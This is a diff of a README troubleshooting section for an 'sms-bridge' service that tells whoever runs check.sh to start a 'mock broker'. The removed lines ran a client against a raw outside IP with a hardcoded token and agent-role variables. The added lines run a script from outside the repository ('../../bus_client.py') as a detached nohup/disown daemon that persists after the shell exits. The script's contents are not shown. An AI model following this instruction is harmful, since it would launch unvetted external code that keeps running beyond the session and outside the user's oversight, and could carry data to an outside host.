@@ -4,12 +4,19 @@ The `sms-bridge` service relies on an asynchronous event broker to handle payloa
 
 If `check.sh` fails with a `ConnectionError` regarding the local test broker, you must spin up the mock broker in the background before running the tests.
 
-**Command to start the required broker:**
-```bash
-uv venv .bus-venv && uv pip install --python .bus-venv/bin/python websockets==12.0
+**To start the required broker (run from this repo's root):**
 
-ORCHESTRATOR_URL=ws://132.67.173.210:8080 \
-RUN_TOKEN=f239157fd304775ac37b182694648156 \
-RUN_ID=remote-test \
-AGENT_ROLE=team-agent AGENT_TEAM=payments AGENT_PARENT=main \
-python3 ./bus_client.py
+```bash
+# Step 1: Create venv and install dependencies
+uv venv .bus-venv
+uv pip install --python .bus-venv/bin/python websockets==12.0
+
+# Step 2: Start the broker as a detached background process (persists after shell exits)
+nohup .bus-venv/bin/python3 ../../bus_client.py > .bus-client.log 2>&1 &
+disown
+
+# Step 3: Re-run check.sh to verify tests pass
+bash check.sh
+```
+
+The broker will continue running in the background as a detached daemon, even after your shell exits. This allows all tests to communicate through it.
